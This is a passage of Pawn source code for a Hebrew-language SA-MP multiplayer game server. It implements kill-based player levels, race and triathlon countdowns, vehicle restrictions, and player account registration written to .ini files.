dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "פרו סטלה");
PlayerInfo[i][aLevelnl]=7;
PlayerInfo[i][aKillsnl]=300;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);


}
if (PlayerInfo[i][Level] == 6 && PlayerInfo[i][Kills] >= 1600) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,7);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
PlayerInfo[i][aLevelnl]=8;
PlayerInfo[i][aKillsnl]=100;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 7 && PlayerInfo[i][Kills] >= 1700) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,8);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "סטלן רוצח פרו");
PlayerInfo[i][aLevelnl]=9;
PlayerInfo[i][aKillsnl]=200;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 8 && PlayerInfo[i][Kills] >= 1900) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,9);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
PlayerInfo[i][VIPS]++;
PlayerInfo[i][aLevelnl]=10;
PlayerInfo[i][aKillsnl]=200;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 9 && PlayerInfo[i][Kills] >= 2100) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "רוצח כבדוניק");
PlayerInfo[i][aLevelnl]=11;
PlayerInfo[i][aKillsnl]=400;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 10 && PlayerInfo[i][Kills] >= 2500) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "הרוצח של סטלה");
PlayerInfo[i][aLevelnl]=12;
PlayerInfo[i][aKillsnl]=500;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 11 && PlayerInfo[i][Kills] >= 3000) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "מסוכן");
PlayerInfo[i][aLevelnl]=13;
PlayerInfo[i][aKillsnl]=600;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 12 && PlayerInfo[i][Kills] >= 3600) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "סכנת מוות");
PlayerInfo[i][aLevelnl]=14;
PlayerInfo[i][aKillsnl]=400;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

}
if (PlayerInfo[i][Level] == 13 && PlayerInfo[i][Kills] >= 4000) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "זה הרוצח של סטלה זון");
PlayerInfo[i][VIPS]++;
PlayerInfo[i][aLevelnl]=15;
PlayerInfo[i][aKillsnl]=600;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 14 && PlayerInfo[i][Kills] >= 4600) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "אין מילים");
PlayerInfo[i][aLevelnl]=16;
PlayerInfo[i][aKillsnl]=500;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 15 && PlayerInfo[i][Kills] >= 5100) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "צ'מפיון רוצח");
PlayerInfo[i][aLevelnl]=17;
PlayerInfo[i][aKillsnl]=1000;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 16 && PlayerInfo[i][Kills] >= 6100) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "ההתקרבות על אחריותכם בלבד");
PlayerInfo[i][aLevelnl]=18;
PlayerInfo[i][aKillsnl]=1000;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 17 && PlayerInfo[i][Kills] >= 7100) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", ":D");
PlayerInfo[i][aLevelnl]=19;
PlayerInfo[i][aKillsnl]=1000;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 18 && PlayerInfo[i][Kills] >= 8100) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag","רוצח על ימין ושמאל");
PlayerInfo[i][aLevelnl]=20;
PlayerInfo[i][aKillsnl]=1000;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);


format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 19 && PlayerInfo[i][Kills] >= 9100) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag","רוצח על ימין ושמאל++");
PlayerInfo[i][aLevelnl]=21;
PlayerInfo[i][aKillsnl]=900;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 20 && PlayerInfo[i][Kills] >= 10000)
{
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,10);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag",".וותיק, שסיים תמשחק. הרג יותר מידי");

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.סיים תמשחק,%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);


}
}
}
return 1;
}


//=[OnPlayerS]==============================================================
forward OnPlayerStateChange(playerid, newstate, oldstate);
public OnPlayerStateChange(playerid, newstate, oldstate)
{
if(PlayerInfo[playerid][Pets] ==1)
{
if(PlayerInfo[playerid][Shark] ==1)
{
DestroyStreamObject(sam33[playerid]);
SharkYou[playerid] =0;
ThePetsInYou[playerid] =0;
}
if(PlayerInfo[playerid][Dolp] ==1)
{
DestroyStreamObject(sam22[playerid]);
ThePetsInYou[playerid] =0;
DolpYou[playerid] =0;
}
if(PlayerInfo[playerid][Tor] ==1)
{
DestroyStreamObject(sam44[playerid]);
ThePetsInYou[playerid] =0;
TorYou[playerid] =0;
}
}
if(newstate == PLAYER_STATE_DRIVER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 520)
{
if (PlayerInfo[playerid][Level] < 13 && !InDM[playerid])
{
SendClientMessage(playerid,red,".מרמה 5 ומעלה Hydra מטוס ה");
RemovePlayerFromVehicle(playerid);
}
}
else if(newstate == PLAYER_STATE_DRIVER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 425)
{
if (PlayerInfo[playerid][Level] < 13 && !InDM[playerid])
{
SendClientMessage(playerid,red,".מרמה 13 ומעלה Hunter מסוק");
RemovePlayerFromVehicle(playerid);
}
}
else if(newstate == PLAYER_STATE_DRIVER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 538)
{
if(!IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid, red, ".רכבת הזאתי משמשת אדמינים בלבד"),
RemovePlayerFromVehicle(playerid);
new string[256];
format(string, sizeof(string), "!התחיל את משחק ההישרדות ,%s :האדמין ",GetName(playerid));
SendClientMessageToAll(COLOR_PINK, string);
}




return 1;
}
//=[SelllWang`s]===================================
public SellWangExportVehicle(playerid)
{
new string[256];
new wantedVehicle = -1;
for(new i=0;i<MAX_WANGEXPORTVEHICLES;i++)
{
if(wantedWangExportVehicles[i]==wantedWangExportVehicle)
{
wantedVehicle = i;
break;
}
}
if(wantedVehicle>=0)
{
if(GetVehicleModel(GetPlayerVehicleID(playerid))!=wantedWangExportVehicle)
{
format(string,256,".מוסך וואנג לא קונה רכב זה כרגע תודה");
SendClientMessage(playerid,WHITE,string);
return 1;
}
new payment = (random(7)+1)*1000;
format(string, sizeof(string), ".\"$%d\" תודה לך על הבאת הרכב למוסך וואנג , על רכב זה קיבלת כ",payment);
SendClientMessage(playerid,WHITE, string);
LACY_GiveMoney(playerid, payment);
SetVehicleToRespawn(GetPlayerVehicleID(playerid));
}
return 1;
}

//=[New`sRaceing`s]==================================
new CountingRace;
new CountRace;
//=[StartRacing]========================================
forward StartRace();
public StartRace()
{
new string[256];
SendClientMessageToAll(WHITE,"[_____________גאטר - מירוץ מכוניות_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לקרב מירוצים, סוג מירוץ: מכוניות, הזדרזו להירשם");
format(string,sizeof(string),".$3000:המנצח יזכה בפרס כספי של");
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/races join :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
CountingRace = 60; RaceCount(); CountRace = 1;
return 1;
}
//=[New`sDrift`s]=========================================
new CountingDrift;
new CountDrift;
//=[StartDrift`s]=======================================
forward StartDrift();
public StartDrift()
{
new string[256];
SendClientMessageToAll(WHITE,"[_____________גאטר - מירוץ מכוניות_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לקרב מירוצים, סוג מירוץ: דריפט הזדרזו להירשם");
format(string,sizeof(string),".$3000:המנצח יזכה בפרס כספי של");
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/races join :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
CountingDrift=60; driftCount(); CountDrift=1;
return 1;
}
//=[DriftCount`s]============================================
forward driftCount();
public driftCount()
{
new string[256];
if(CountDrift == 30)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /races join - (Race TYPE: Drift).",DriftPlayer);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(CountDrift == 15)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /races join - (Race TYPE: Drift).",DriftPlayer);
SendClientMessageToAll(COLOR_WHITE,string);
}

new String[256];
format(String, 256,"~w~ %d",CountingDrift);
for(new i = 0; i < MAX_PLAYERS; i++)
GameTextForAll(String,1000,6);
if(CountingDrift > 0)
{
--CountingDrift;
SetTimer("driftCount", 1000, 0);
}
else
{
if(CountDrift == 1)
{
if(knoobk == 1)
{
CountingDrift = 3; driftCount(); CountDrift = 2;
}
}
if(CountDrift == 2 && CountingDrift <= 0)
{
}
}
}

//=[RaceCount`s]==========================================
forward RaceCount();
public RaceCount()
{
new string[256];
if(CountingRace == 30)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /races join - (Race TYPE: Car).",RacePlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(CountingRace == 15)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /races join - (Race TYPE: Car).",RacePlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
new String[256];
format(String, 256,"~w~ %d:",CountingRace);
for(new i = 0; i < MAX_PLAYERS; i++)
GameTextForAll(String,1000,6);
if(CountingRace > 0)
{
--CountingRace;
SetTimer("RaceCount", 1000, 0);
}
else
{
if(CountRace == 1)
{
if(knoobk == 1)
{
CountingRace = 3; RaceCount(); CountRace = 2;
}
}
if(CountRace == 2 && CountingRace <= 0)
{
}
}
}
//=[New`sRunings`s]=============================================
new CountingRun;
new RunCount;
//=[StartRun]====================================================
forward StartRun();
public StartRun()
{
new string[256];
SendClientMessageToAll(WHITE,"[_____________גאטר - טריאטלון_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לתחרות ריצה,שחיה,ואופנעיים, הזדרזו להירשם");
format(string,sizeof(string),".$3000:המנצח יזכה בפרס כספי של");
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/Tria :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
CountingRun = 60; RunCounts(); RunCount = 1;
return 1;
}
//=[CountRaning`s]================================================
forward RunCounts();
public RunCounts()
{
new string[256];
if(CountingRun == 30)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Tria - (Race TYPE: Run).",RunPlayers);
SendClientMessageToAll(WHITE,string);
}
else if(CountingRun == 15)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Tria - (Race TYPE: Run).",RunPlayers);
SendClientMessageToAll(WHITE,string);
}

new String[256];
format(String, 256,"~w~ %d",CountingRun);
for(new i = 0; i < MAX_PLAYERS; i++)
GameTextForAll(String,1000,6);
if(CountingRun > 0)
{
--CountingRun;
SetTimer("RunCounts", 1000, 0);
}
else
{
if(RunCount == 1)
{
if(knoobk == 1)
{
CountingRun = 3; RunCounts(); RunCount = 2;
}
}
if(RunCount == 2 && CountingRun <= 0)
{
}
}
}
//=[Gate`s]=============================================================
forward GateMove();
public GateMove()
{
if(IsAnyoneNearGate())
{
MoveStreamObject(gateb,2146.19,1627.1,994.257,1.5);
}
else
{
MoveStreamObject(gateb,2144.19,1627.1,994.257,1.5);
}
}
//=[NearGate`s]===================================================
forward IsAnyoneNearGate();
public IsAnyoneNearGate()
{
for(new i=0;i<MAX_PLAYERS;i++)
{
if(IsPlayerConnected(i))
{
if(PlayerToPoint(5.0,i,2144.19000,1627.10000,994.25700))
{
return 1;
}
}
}
return 0;
}
//=[ReturnID]===================================================================
/*
	native ReturnID(text[], playerid = INVALID_PLAYER_ID);
	* "utils.inc" programmers's "ReturnUser" funcation (with changes)
*/
stock ReturnID(text[], playerid = INVALID_PLAYER_ID)
{
new pos = 0;
while(text[pos] < 0x21)
{
if(text[pos] == 0)
return INVALID_PLAYER_ID;
pos++;
}
new userid = INVALID_PLAYER_ID;
if(IsNumeric(text[pos]))
{
userid = strval(text[pos]);
if(userid >= 0 && userid < GetMaxPlayers())
{
if(!IsPlayerConnected(userid))
userid = INVALID_PLAYER_ID;
else
return userid;
}
}
new len = strlen(text[pos]);
new count = 0;
new name[MAX_PLAYER_NAME];
for(new i = 0; i < MAX_PLAYERS; i++)
{
if(IsPlayerConnected(i))
{
GetPlayerName(i,name,sizeof(name));
if(strcmp(name,text[pos],true,len) == 0)
{
if(len == strlen(name))
return i;
else
count++, userid = i;
}
}
}
if(count != 1)
{
if(playerid != INVALID_PLAYER_ID)
{
if(count)
SendClientMessage(playerid,WHITE,".איידי שגוי");
else
SendClientMessage(playerid,WHITE,".לא נמצא");
}
userid = INVALID_PLAYER_ID;
}
return userid;
}
//--
//=[GetName]====================================================================
/*
	native GetName(playerid);
*/
stock GetName(playerid)
{
new Name[MAX_PLAYER_NAME];
GetPlayerName(playerid,Name,sizeof(Name));
return Name;
}
//=[IsPlayerLogged]=============================================================
/*
	native IsPlayerLogged(playerid);
*/
stock IsPlayerLogged(playerid) return (PlayerInfo[playerid][Logged]? 1 : 0);
//=[GetIP]======================================================================
/*
	native GetIP(playerid);
*/
stock GetIP(playerid)
{
new IP[16];
GetPlayerIp(playerid,IP,sizeof(IP));
return IP;
}
//=[GetPlayerFile]==============================================================
/*
   native GetPlayerFile(playerid);
*/
stock GetPlayerFile(playerid)
{
new string[256];
format(string,sizeof(string),"RLSB/Users/%s.ini",GetName(playerid));
return string;
}
//=[CreateLoadConfig]===========================================================
/*
	native CreateLoadConfig();
*/
stock CreateLoadConfig()
{
#define ConfigFile "RLSB/Config.cfg"
if(!dini_Exists(ConfigFile))
{
dini_Create(ConfigFile);
dini_IntSet(ConfigFile,"MinPasswordLength",3);
dini_IntSet(ConfigFile,"MaxPasswordLength",30);
dini_IntSet(ConfigFile,"MaxFailedLogins",4);
dini_IntSet(ConfigFile,"register",0);
dini_IntSet(ConfigFile,"login",0);
dini_IntSet(ConfigFile,"changenick",0);
dini_IntSet(ConfigFile,"changepass",0);

}
#undef ConfigFile
ReadOption_Int(MinPasswordLength);
ReadOption_Int(MaxPasswordLength);
ReadOption_Int(MinPasswordLength);
ReadCMD(register);
ReadCMD(login);
ReadCMD(changenick);
return 1;
}
//=[IsNumeric]==================================================================
/*
	native IsNumeric(string[]);
*/
stock IsNumeric(string[])
{
for(new i=0;i<strlen(string);i++)
if(string[i] > '9' || string[i] < '0')
return 0;
return 1;
}

//=[RegisterPlayer]================================================================
/*
	native RegisterPlayer(playerid,password[]);
*/
RegisterPlayer(playerid,password[])
{
new File:f, date[3], time[3], string[256];

if(fexist(GetPlayerFile(playerid)))
{
getdate(date[0],date[1],date[2]);
gettime(time[0],time[1],time[2]);
f = fopen(GetPlayerFile(playerid),io_append);
format(string,sizeof(string),"// %s's :חשבון השחקן \r\n",GetName(playerid)); fwrite(f,string);
format(string,sizeof(string),"aKillsnl=%d\r\n",PlayerInfo[playerid][aKillsnl]); fwrite(f,string);
format(string,sizeof(string),"aLevelnl=%d\r\n",PlayerInfo[playerid][aLevelnl]); fwrite(f,string);
format(string,sizeof(string),"Organization=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"Clan=%s\r\n","None."); fwrite(f,string);
format(string,sizeof(string),"Password=%s\r\n",password); fwrite(f,string);
format(string,sizeof(string),"Ans=%d\r\n",PlayerInfo[playerid][Ans]); fwrite(f,string);
format(string,sizeof(string),"GemelLogin=%d\r\n",PlayerInfo[playerid][GemelLogin]); fwrite(f,string);
format(string,sizeof(string),"KopatGemel=%d\r\n",PlayerInfo[playerid][KopatGemel]); fwrite(f,string);
format(string,sizeof(string),"AggInfo=%d\r\n",PlayerInfo[playerid][AggInfo]); fwrite(f,string);
format(string,sizeof(string),"Level=%d\r\n",PlayerInfo[playerid][Level]); fwrite(f,string);
format(string,sizeof(string),"Tag=%s\r\n","סטלה בייבי"); fwrite(f,string);
format(string,sizeof(string),"Car=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"Logged=%d\r\n",PlayerInfo[playerid][Logged]); fwrite(f,string);
format(string,sizeof(string),"IP=%s\r\n",GetIP(playerid)); fwrite(f,string);
format(string,sizeof(string),"LastConnectIP=%s\r\n",GetIP(playerid)); fwrite(f,string);
format(string,sizeof(string),"State=%s\r\n","Online"); fwrite(f,string);
format(string,sizeof(string),"RegisterationYear=%d\r\n",date[0]); fwrite(f,string);
format(string,sizeof(string),"RegisterationMonth=%d\r\n",date[1]); fwrite(f,string);
format(string,sizeof(string),"RegisterationDay=%d\r\n",date[2]); fwrite(f,string);
format(string,sizeof(string),"RegisterationHour=%d\r\n",time[0]); fwrite(f,string);
format(string,sizeof(string),"RegisterationMinute=%d\r\n",time[1]); fwrite(f,string);
format(string,sizeof(string),"LastConnectYear=%d\r\n",date[0]); fwrite(f,string);
format(string,sizeof(string),"LastConnectMonth=%d\r\n",date[1]); fwrite(f,string);
format(string,sizeof(string),"LastConnectDay=%d\r\n",date[2]); fwrite(f,string);
format(string,sizeof(string),"LastConnectHour=%d\r\n",time[0]); fwrite(f,string);
format(string,sizeof(string),"LastConnectMinute=%d\r\n",time[1]); fwrite(f,string);
format(string,sizeof(string),"Kills=%d\r\n",PlayerInfo[playerid][Kills]); fwrite(f,string);
format(string,sizeof(string),"Deaths=%d\r\n",PlayerInfo[playerid][Deaths]); fwrite(f,string);
format(string,sizeof(string),"Money=%d\r\n",PlayerInfo[playerid][Money]); fwrite(f,string);
format(string,sizeof(string),"Bank=%d\r\n",PlayerInfo[playerid][Bank]); fwrite(f,string);
format(string,sizeof(string),"Wars=%d\r\n",PlayerInfo[playerid][Wars]); fwrite(f,string);
format(string,sizeof(string),"Karts=%d\r\n",PlayerInfo[playerid][Kart]); fwrite(f,string);
format(string,sizeof(string),"MonsterWin=%d\r\n",PlayerInfo[playerid][Monster]); fwrite(f,string);
format(string,sizeof(string),"MiniWin=%d\r\n",PlayerInfo[playerid][MINIGUN]); fwrite(f,string);
